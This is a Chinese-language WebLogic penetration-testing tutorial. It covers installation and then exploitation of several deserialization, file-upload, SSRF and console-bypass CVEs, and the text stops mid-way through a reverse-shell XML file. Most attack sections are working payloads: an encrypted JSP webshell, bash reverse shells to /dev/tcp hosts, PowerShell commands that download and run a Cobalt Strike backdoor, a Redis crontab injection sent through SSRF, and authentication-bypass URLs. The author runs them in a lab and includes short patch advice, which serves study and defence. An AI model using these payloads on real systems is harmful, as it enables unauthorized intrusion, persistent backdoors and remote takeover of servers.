## 一.weblogic简介

WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA
WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic
Server具有标准和可扩展性的优点，对业内多种标准都可全面支持，包括EJB、JSP、Servlet、JMS、JDBC、XML（标准通用标记语言的子集）和WML，使Web应用系统的实施更为简单，并且保护了投资，同时也使基于标准的解决方案的开发更加简便，同时WebLogic
Server以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源pooling以及动态网页和EJB组件群集。

默认端口： 7001

目前较为活跃的版本：

    
    
    Weblogic 10.3.6.0
    Weblogic 12.1.3.0
    Weblogic 12.2.1.1
    Weblogic 12.2.1.2
    Weblogic 12.2.1.3
    

## 二.weblogic安装

下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

weblogic最新的版本需要jdk1.8以上，如果jdk1.7或者以下，可能会安装不了，jdk1.6的话应该是10.3.6及以下。

### 1.weblogic 10.3.6安装

这里安装环境为win7

![image-20210809105230816](https://image.3001.net/images/20210816/1629074935_6119b5f722c8332b863b5.png!small)

![image-20210809105644198](https://image.3001.net/images/20210816/1629074936_6119b5f8cd526163bb036.png!small)

双击启动安装

![image-20210809105814087](https://image.3001.net/images/20210816/1629074937_6119b5f9c6cab77f6af21.png!small)

![](https://image.3001.net/images/20210816/1629074938_6119b5fa9f436f0ff3eea.png!small)

![image-20210809110119887](https://image.3001.net/images/20210816/1629074939_6119b5fb93a18f70fee1f.png!small)

![image-20210809110133160](https://image.3001.net/images/20210816/1629074940_6119b5fc620faf4bcc66f.png!small)

![image-20210809110203679](https://image.3001.net/images/20210816/1629074941_6119b5fd46b6dae539710.png!small)

![image-20210809110238157](https://image.3001.net/images/20210816/1629074942_6119b5fe32ab581ffdedf.png!small)

![image-20210809154158552](https://image.3001.net/images/20210816/1629074943_6119b5ff25129141e7abd.png!small)

![image-20210809154229316](https://image.3001.net/images/20210816/1629074944_6119b6000d19878275e17.png!small)

![image-20210809110431311](https://image.3001.net/images/20210816/1629074945_6119b6011762df080c181.png!small)

![image-20210809110646798](https://image.3001.net/images/20210816/1629074946_6119b60277e2a61405493.png!small)

安装完成后自动出现快速启动页面

![](https://image.3001.net/images/20210816/1629074947_6119b603e3eccaeecf670.png!small)

![image-20210809111057748](https://image.3001.net/images/20210816/1629074948_6119b604d8bfd34ffda0e.png!small)

![](https://image.3001.net/images/20210816/1629074949_6119b605bbcdbb6e6e0f9.png!small)

这里默认即可

![image-20210809111349116](https://image.3001.net/images/20210816/1629074950_6119b60677f3f1ab3a64d.png!small)

这里我的是zcc12345

![](https://image.3001.net/images/20210816/1629074951_6119b60733a8833c96fb7.png!small)

开发模式：该模式启用自动部署；生产模式：该模式关闭自动部署(MyEcipse版本不支持产品模式)

![image-20210809134240451](https://image.3001.net/images/20210816/1629074952_6119b60802aadf732a0c4.png!small)

![image-20210809134317197](https://image.3001.net/images/20210816/1629074952_6119b608d31a16d364d41.png!small)

![image-20210809134433087](https://image.3001.net/images/20210816/1629074954_6119b60a1634a00ecd315.png!small)

一直默认下一步之后点击创建

![image-20210809134616650](https://image.3001.net/images/20210816/1629074955_6119b60b55677b9f685bd.png!small)

![image-20210809134650091](https://image.3001.net/images/20210816/1629074956_6119b60c1e970b74e5fc6.png!small)

### 2.weblogic 10.3.6配置

进入该目录下，双击红框中的startWebLogic.cmd，启动weblogic

![image-20210809134918621](https://image.3001.net/images/20210816/1629074957_6119b60d0dc36674bdd12.png!small)

输入刚刚设置的weblogic用户名和密码

    
    
    weblogic
    zcc12345
    

![image-20210809135306951](https://image.3001.net/images/20210816/1629074958_6119b60e081bf77b47a71.png!small)

打开浏览器输入控制台url，进入控制台进行管理

    
    
    http://192.168.10.154:7001/console/

![](https://image.3001.net/images/20210816/1629074959_6119b60f726daabd4a749.png!small)

用户名密码还是上面设置的weblogic/zcc12345

### 3.weblogic 12.1.3安装

12版本的安装需要在jdk7的环境下，这里我已经安装完成

![image-20210814161036126](https://image.3001.net/images/20210816/1629074960_6119b610b81692c5c0285.png!small)

![image-20210814162020929](https://image.3001.net/images/20210816/1629074961_6119b6118dfcf57e7e05a.png!small)

官网下载安装包，官网链接：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

![image-20210814160458436](https://image.3001.net/images/20210816/1629074963_6119b6130b914a24d8362.png!small)

将下载好的安装包放入jdk的bin目录下，防止因环境变量带空格导致的错误，过程一直默认下一步即可

![image-20210814162427162](https://image.3001.net/images/20210816/1629074964_6119b61446bb88a996177.png!small)

这里一定要以管理员身份运行，不然提取文件会失败

    
    
    java -jar fmw_12.1.3.0.0_wls.jar
    

![image-20210814163432029](https://image.3001.net/images/20210816/1629074965_6119b61511e8be7644ccf.png!small)

![](https://image.3001.net/images/20210816/1629074965_6119b615c0d9af46264e2.png!small)

![image-20210814165250515](https://image.3001.net/images/20210816/1629074967_6119b6176cf29279fcb87.png!small)

![image-20210814165616715](https://image.3001.net/images/20210816/1629074969_6119b6192ad26d344d1f9.png!small)

接下来安装域

在电脑上找到Configuration Wizard，双击运行

![image-20210814165704899](https://image.3001.net/images/20210816/1629074970_6119b61a3e2212c0f6d08.png!small)

选择下一步->下一步

![image-20210814165802594](https://image.3001.net/images/20210816/1629074971_6119b61b4e60b1613e46a.png!small)

输入口令，这里用户名默认，口令设置的是zcc12345

![image-20210814165857818](https://image.3001.net/images/20210816/1629074972_6119b61c9e525f9ad320a.png!small)

下一步

![image-20210814165945030](https://image.3001.net/images/20210816/1629074973_6119b61dd35f2c67f75c8.png!small)

![image-20210814165958254](https://image.3001.net/images/20210816/1629074975_6119b61f3c8a92d5e10e8.png!small)

选本机IP

![image-20210814170040154](https://image.3001.net/images/20210816/1629074976_6119b62083cf766b0ebf1.png!small)

![image-20210814170128516](https://image.3001.net/images/20210816/1629074977_6119b621c9536d145693b.png!small)

![image-20210814170217064](https://image.3001.net/images/20210816/1629074980_6119b6249fecdba4707fa.png!small)

![image-20210814170242532](https://image.3001.net/images/20210816/1629074982_6119b6262f6411fb8f68d.png!small)

![image-20210814170306146](https://image.3001.net/images/20210816/1629074983_6119b627aa00febf148a2.png!small)

### 4.weblogic 12.1.3配置

进入该目录下启动，这里不再需要输入账号密码

    
    
    C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain
    

![image-20210814170531939](https://image.3001.net/images/20210816/1629074984_6119b628f1b2d1c4b410a.png!small)

![](https://image.3001.net/images/20210816/1629074986_6119b62a5d8ae848977ca.png!small)

成功搭建，可正常访问。

## 三.weblogic渗透总结

### 1.XMLDecoder 反序列化漏洞 CVE-2017-10271

漏洞简介

Weblogic的WLS
Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

影响版本

    
    
    10.3.6.0
    12.1.3.0.0
    12.2.1.1.0
    

验证漏洞

当访问该路径 /wls-wsat/CoordinatorPortType （POST），出现如下图所示的回显时，只要是在wls-wsat包中的皆受到影响，可以查看web.xml查看所有受影响的url，说明存在该漏洞；

![image-20210809140942304](https://image.3001.net/images/20210816/1629074987_6119b62b6e483d922d60b.png!small)

    
    
    C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF
    

进行该路径查看web.xml;

![image-20210809141314849](https://image.3001.net/images/20210816/1629074988_6119b62c6c81a3e74fd23.png!small)

![image-20210809141512699](https://image.3001.net/images/20210816/1629074989_6119b62d9d0805bba6706.png!small)

总结下来就是下面这些url会受到影响；

    
    
    /wls-wsat/CoordinatorPortType
    /wls-wsat/RegistrationPortTypeRPC
    /wls-wsat/ParticipantPortType
    /wls-wsat/RegistrationRequesterPortType
    /wls-wsat/CoordinatorPortType11
    /wls-wsat/RegistrationPortTypeRPC11
    /wls-wsat/ParticipantPortType11
    /wls-wsat/RegistrationRequesterPortType11
    

漏洞复现

抓包，修改内容

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
     <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
     <java><java version="1.4.0" class="java.beans.XMLDecoder">
     <object class="java.io.PrintWriter"> 
     <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string>
     <void method="println">
    <string>
     <![CDATA[
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
     ]]>
     </string>
     </void>
     <void method="close"/>
     </object></java></java>
     </work:WorkContext>
     </soapenv:Header>
     <soapenv:Body/>
    </soapenv:Envelope>
    

![](https://image.3001.net/images/20210816/1629074991_6119b62f0102b6f88b0b6.png!small)

![image-20210809162737924](https://image.3001.net/images/20210816/1629074991_6119b62fdef0177f6e338.png!small)

![image-20210809162717485](https://image.3001.net/images/20210816/1629074992_6119b630af6092da39e4f.png!small)

实现Linux反弹shell的poc：

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: x.x.x.x:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 637
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &ampgt&ampamp /dev/tcp/x.x.x.x/4444 0&ampgt&ampamp1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

实现win上线cs

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.10.154:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 704
    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>powershell</string>
     </void>
     <void index="1">
     <string>-Command</string>
     </void>
     <void index="2">
     <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

cs生成后门木马

![image-20210810105923024](https://image.3001.net/images/20210816/1629074993_6119b631a463e2e3d6c0b.png!small)

放在kali上，开启简易的http服务

![image-20210810110037377](https://image.3001.net/images/20210816/1629074994_6119b63297d29eb8e3d18.png!small)

powershell上线cs：

    
    
    powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
    

![image-20210810111100065](https://image.3001.net/images/20210816/1629074995_6119b6338b7a455b5ead7.png!small)

![image-20210810110916447](https://image.3001.net/images/20210816/1629074996_6119b6349fdc1569ebda6.png!small)

成功上线cs

安全防护

前往Oracle官网下载10月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

### 2.XMLDecoder 反序列化漏洞 CVE-2017-3506

漏洞简介

cve-2017-10271与3506他们的漏洞原理是一样的,只不过10271绕过了3506的补丁，CVE-2017-3506的补丁加了验证函数，验证Payload中的节点是否存在object
Tag。

    
    
    private void validate(InputStream is){
     WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
     try {
     SAXParser parser =factory.newSAXParser();
     parser.parse(is, newDefaultHandler() {
     public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException {
     if(qName.equalsIgnoreCase("object")) {
     throw new IllegalStateException("Invalid context type: object");
     }
     }
     });
     } catch(ParserConfigurationException var5) {
     throw new IllegalStateException("Parser Exception", var5);
     } catch (SAXExceptionvar6) {
     throw new IllegalStateException("Parser Exception", var6);
     } catch (IOExceptionvar7) {
     throw new IllegalStateException("Parser Exception", var7);
     }
     }
    

影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.0
    12.2.1.1 
    12.2.1.2
    

漏洞复现

利用的poc:

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
     <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
     <java>
     <object class="java.io.PrintWriter">
     <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string>
     <void method="println">
     <string>
     <![CDATA[
     <% out.print("zcc1 hello"); %>
     ]]>
     </string>
     </void>
     <void method="close"/>
     </object>
     </java>
     </work:WorkContext>
     </soapenv:Header>
     <soapenv:Body/>
    </soapenv:Envelope>
    

![](https://image.3001.net/images/20210816/1629074997_6119b635ba1abd3309325.png!small)

![image-20210810141515224](https://image.3001.net/images/20210816/1629074998_6119b636e487985154979.png!small)

安全防护

前往Oracle官网下载10月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

### 3.wls-wsat反序列化远程代码执行漏洞 CVE-2019-2725

漏洞简介

此漏洞实际上是CVE-2017-10271的又一入口，CVE-2017-3506的补丁过滤了object；CVE-2017-10271的补丁过滤了new，method标签，且void后面只能跟index，array后面只能跟byte类型的class；CVE-2019-2725的补丁过滤了class，限制了array标签中的byte长度。

影响组件

    
    
    bea_wls9_async_response.war
    wsat.war
    

影响版本

    
    
    10.3.*
    12.1.3
    

验证漏洞

访问 /_async/AsyncResponseService，返回200则存在，404则不存在

查看web.xml得知受影响的url如下：

访问路径为：

    
    
    C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF
    

![image-20210810143210331](https://image.3001.net/images/20210816/1629074999_6119b637e42c70fd0661c.png!small)

    
    
    /_async/AsyncResponseService
    /_async/AsyncResponseServiceJms
    /_async/AsyncResponseServiceHttps
    /_async/AsyncResponseServiceSoap12
    /_async/AsyncResponseServiceSoap12Jms
    /_async/AsyncResponseServiceSoap12Https
    

漏洞复现

访问该url，回显如下，说明存在漏洞

![image-20210810142738800](https://image.3001.net/images/20210816/1629075001_6119b6391ea8471cf9f6b.png!small)

win上线cs的poc如下，这里exe用的是上面生成的：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
    xmlns:asy="http://www.bea.com/async/AsyncResponseService">
    <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>powershell</string>
    </void>
    <void index="1">
    <string>-Command</string>
    </void>
    <void index="2">
    <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header><soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    

![](https://image.3001.net/images/20210816/1629075002_6119b63a4c1e8564e5418.png!small)

![](https://image.3001.net/images/20210816/1629075003_6119b63b65cff1a98d33a.png!small)

安全防护

1、升级本地JDK环境

2、及时安装官方补丁

### 4.WebLogic T3协议反序列化命令执行漏洞 CVE-2018-2628

漏洞简介

远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议（EJB支持远程访问，且支持多种协议。这是Web Container和EJB
Container的主要区别）在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java
Remote Messaging Protocol：java远程消息交换协议）达到执行任意反序列化 payload 的目的。

影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.1
    12.2.1.2
    

相关漏洞

    
    
    CVE-2015-4852
    CVE-2016-0638
    CVE-2016-3510
    CVE-2017-3248
    CVE-2018-2893
    CVE-2016-0638
    

验证漏洞

使用脚本跑，脚本运行需python2环境，出现如下图所示的回显时，说明存在该漏洞；

脚本链接：https://github.com/shengqi158/CVE-2018-2628

![image-20210810160702675](https://image.3001.net/images/20210816/1629075004_6119b63ca9f4a4b8d0733.png!small)

![image-20210810160718697](https://image.3001.net/images/20210816/1629075006_6119b63e955ab01dbb5c5.png!small)

漏洞复现

windows-getshell，使用k8weblogicGUI.exe

![image-20210810163031055](https://image.3001.net/images/20210816/1629075008_6119b6404dfeecefc408a.png!small)

这里出了点问题，文件名改成了1.jsp

![image-20210810164738168](https://image.3001.net/images/20210816/1629075009_6119b6419296fb3e10f54.png!small)

用脚本连接得到交互shell,脚本运行需python2环境

脚本链接：https://github.com/jas502n/CVE-2018-2628

![image-20210810165228766](https://image.3001.net/images/20210816/1629075010_6119b64276cbf080d2fa2.png!small)

在此处上线cs，用的依旧是上面的马，改名zcc3.exe

    
    
    powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
    

![image-20210810170001387](https://image.3001.net/images/20210816/1629075011_6119b64379b9bd7382815.png!small)

![image-20210810170039655](https://image.3001.net/images/20210816/1629075012_6119b644691fb4a1fe0bc.png!small)

安全防护

过滤t3协议，再域结构中点击 安全->筛选器，选择筛选器填：

    
    
    weblogic.security.net.ConnectionFilterImpl
    

![image-20210813140332501](https://image.3001.net/images/20210816/1629075013_6119b645803c8a904fc4c.png!small)

保存后重启weblogic即可。

### 5.WebLogic 未授权访问漏洞（CVE-2018-2894）

漏洞简介

Weblogic Web Service Test
Page中有两个未授权页面，可以上传任意文件。但是有一定的限制，该页面在开发模式下存在，在生产模式下默认不开启，如果是生产模式，需要登陆后台进行勾选启动web服务测试页，如下图。

![image-20210813145148182](https://image.3001.net/images/20210816/1629075016_6119b648d3f4f1b3431d9.png!small)

影响版本

    
    
    10.3.6
    12.1.3
    12.2.1.2
    12.2.1.3
    

验证漏洞

测试页有两个

    
    
    /ws_utc/config.do
    /ws_utc/begin.do
    

漏洞复现

这里要注意的是12版本，以前以及现在的默认安装是“开发模式”，“生产模式”下没有这两处上传点。如果是生产模式，需要登陆后台进行如下配置：（开发环境下不需要！！）

![image-20210814171049349](https://image.3001.net/images/20210816/1629075021_6119b64d77fe3008ecd51.png!small)

![](https://image.3001.net/images/20210816/1629075022_6119b64edadb4372543fd.png!small)

勾选启用web服务测试项，保存重启weblogic即可

![](https://image.3001.net/images/20210816/1629075024_6119b6502873ba39050b3.png!small)

> 1.测试/ws_utc/config.do

访问/ws_utc/config.do页面，首先设置一下路径，设置Work Home
Dir为ws_utc应用的静态文件css目录，因为默认上传目录不在Web目录无法执行webshell，这里设置为：(css访问不需要任何权限)

    
    
    C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
    

![](https://image.3001.net/images/20210816/1629075025_6119b6512f3b742a7894b.png!small)

![](https://image.3001.net/images/20210816/1629075026_6119b6520709124865f01.png!small)

![image-20210813152013436](https://image.3001.net/images/20210816/1629075026_6119b652af850b40aa3f9.png!small)

提交后，点击左边安全->添加，上传jsp大马

![](https://image.3001.net/images/20210816/1629075027_6119b65388a5a72c7860f.png!small)

![](https://image.3001.net/images/20210816/1629075028_6119b654719411d365ff6.png!small)

获取文件id：1628933663766

![](https://image.3001.net/images/20210816/1629075029_6119b6551f4de27b58dca.png!small)

访问url：

    
    
    http://192.168.0.105/:7001/ws_utc/css/config/keystore/{时间戳}_{文件名}
    http://192.168.0.105:7001/ws_utc/css/config/keystore/1628933663766_JspSpy.jsp
    

![image-20210814173547786](https://image.3001.net/images/20210816/1629075029_6119b655e5ffaacf72eec.png!small)

输入密码

![image-20210814173903964](https://image.3001.net/images/20210816/1629075030_6119b656a53ede82969d5.png!small)

![image-20210814174004800](https://image.3001.net/images/20210816/1629075031_6119b65789c01e33f2284.png!small)

可以看见成功上线，同样方法也可以上传一句话或者其他木马。

> 2.测试 /ws_utc/begin.do

大致方法和上面的url一样，这里需要注意的是

    
    
    1./ws_utc/begin.do使用的工作目录是在/ws_utc/config.do中设置的Work Home Dir；
    2.利用需要知道部署应用的web目录；
    3.在生产模式下不开启，后台开启后，需要认证。
    

![image-20210814175127172](https://image.3001.net/images/20210816/1629075032_6119b6587f2833a412988.png!small)

  

![image-20210814180116136](https://image.3001.net/images/20210816/1629075033_6119b65944296f4e8a8f2.png!small)

报错可以忽略，返回包中已有文件路径

    
    
    /css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
    

![image-20210814180054350](https://image.3001.net/images/20210816/1629075034_6119b65a4bce8aa2c254b.png!small)

访问路径，成功访问，powershell上线cs

    
    
    http://192.168.0.105:7001/ws_utc/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
    

![](https://image.3001.net/images/20210816/1629075035_6119b65b5c0bea49f5854.png!small)

    
    
    powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
    

![](https://image.3001.net/images/20210816/1629075036_6119b65c1a16eb3474875.png!small)

![image-20210814181718937](https://image.3001.net/images/20210816/1629075036_6119b65ce9f7a4afb61b9.png!small)

安全防护

1.启动生产模式后Config.do页面登录授权后才可访问

2.升级到最新版本，目前生产模式下已取消这两处上传文件的地方。

### 6.Weblogic SSRF漏洞（CVE-2014-4210）

漏洞简介

Oracle WebLogic Web
Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic
server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口，进而攻击内网中redis、fastcgi等脆弱组件。

影响版本

    
    
    10.0.2.0
    10.3.6.0
    

验证漏洞

访问该路径，如果能正常访问，说明存在该漏洞

    
    
    /uddiexplorer/SearchPublicRegistries.jsp
    

![image-20210814185115833](https://image.3001.net/images/20210816/1629075037_6119b65dc3754f2503202.png!small)

漏洞复现

这里复现用的vulhub靶场环境

![](https://image.3001.net/images/20210816/1629075038_6119b65edac85785c9233.png!small)

抓包，在url后跟端口,把url修改为自己搭建的服务器地址,访问开放的7001端口

![image-20210814192248494](https://image.3001.net/images/20210816/1629075039_6119b65fef890f54e2db5.png!small)

![image-20210814192515111](https://image.3001.net/images/20210816/1629075041_6119b6610d968ef798527.png!small)

发现返回如下信息，说明开放7001端口，但是不是http协议

    
    
    An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &#40;Not Found&#41;.  Please ensure that your URL is correct, and the web service has deployed without error.	
    

访问未开放的端口，会返回下面的信息

    
    
    An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7002&#39;
    

![image-20210814193417626](https://image.3001.net/images/20210816/1629075042_6119b6626fb29b9001dff.png!small)

访问存在的端口，且为http协议时返回如下

    
    
    An error has occurred<BR>
    weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
    

![image-20210814203203147](https://image.3001.net/images/20210816/1629075043_6119b66399ec8cb86e4a7.png!small)

### 7.weblogic SSRF联动Redis

漏洞复现

依旧用的上面这个靶场

![image-20210814204005054](https://image.3001.net/images/20210816/1629075044_6119b664b267f7f47a01d.png!small)

这里查一下开启redis服务的这个容器IP，找到ip：172.20.0.2

    
    
    docker inspect a5a
    

![image-20210814204200558](https://image.3001.net/images/20210816/1629075045_6119b6658e1e40c572da0.png!small)

可以看见6379的端口存在，且为http协议

![image-20210814204413085](https://image.3001.net/images/20210816/1629075046_6119b6668f2220d8d3eaf.png!small)

本机监听12345端口

![image-20210814204756777](https://image.3001.net/images/20210816/1629075047_6119b667a23ce3df7820b.png!small)

burp改包直接将弹shell脚本到本机kail上（192.168.0.104）

    
    
    set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"
    config set dir /etc/
    config set dbfilename crontab
    save
    

经过url编码后，写入bp中operator参数的后面:

    
    
    operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F12345%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
    

![image-20210814210942824](https://image.3001.net/images/20210816/1629075048_6119b668980fa28f4ea25.png!small)

![image-20210814211117689](https://image.3001.net/images/20210816/1629075050_6119b66a48156e5c1d16c.png!small)

反弹shell成功。

安全防护

升级高版本。

### 8.Weblogic弱口令&&后台getshell

漏洞简介

由于管理员的安全意识不强，或者配置时存在疏忽，会导致后台存在弱口令或者默认的用户名/口令。

影响版本

全版本

漏洞复现

通过弱口令登录管理台后，点击部署->安装

![image-20210814212040819](https://image.3001.net/images/20210816/1629075051_6119b66b5700534bb1248.png!small)

![image-20210814212434754](https://image.3001.net/images/20210816/1629075052_6119b66ce5fcca1f0450f.png!small)

![image-20210814212521338](https://image.3001.net/images/20210816/1629075054_6119b66e53568e0a94220.png!small)

这里war包成功上传

![image-20210814212645817](https://image.3001.net/images/20210816/1629075055_6119b66f7c3c15bd1fe03.png!small)

将其作为应用程序安装

  

![image-20210814212917962](https://image.3001.net/images/20210816/1629075056_6119b670addb10c3a174a.png!small)

点击完成。

![image-20210814213012827](https://image.3001.net/images/20210816/1629075057_6119b671b24ec8d428f29.png!small)

可以看见部署成功，访问url

    
    
    http://192.168.0.105:7001/zcc/JspSpy.jsp
    

输入密码，即可成功拿到webshell

![image-20210814214304327](https://image.3001.net/images/20210816/1629075058_6119b672d83e6633151a4.png!small)

安全防护

避免出现弱口令

### 9.Weblogic Console HTTP协议远程代码执行漏洞(CVE-2020-14882/CVE-2020-14883)

漏洞简介

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server
上执行任意代码。它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.3
    12.2.1.4
    14.1.1.0
    

漏洞复现

CVE-2020-14883: 权限绕过漏洞的poc：

    
    
    http://192.168.0.105:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
    

访问该url之后，进入如下页面，可以看见成功进入管理台：

![image-20210814220636352](https://image.3001.net/images/20210816/1629075060_6119b67444b86cd6b7b58.png!small)

CVE-2020-14882: 代码执行漏洞的poc：

    
    
    http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.
    mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
    

这里复现用的vulhub靶场

![image-20210814222333621](https://image.3001.net/images/20210816/1629075061_6119b675cdc3e8e735d83.png!small)

访问报404，不要慌，此时去容器中看会发现文件已成功写入；

![image-20210814221311713](https://image.3001.net/images/20210816/1629075062_6119b676eb6cfff31dab3.png!small)

![](https://image.3001.net/images/20210816/1629075063_6119b677ec44d155f0900.png!small)

这里执行反弹shell的xml文件poc.xml：

    
    
    ## poc.xml
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
      <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>
          </list>
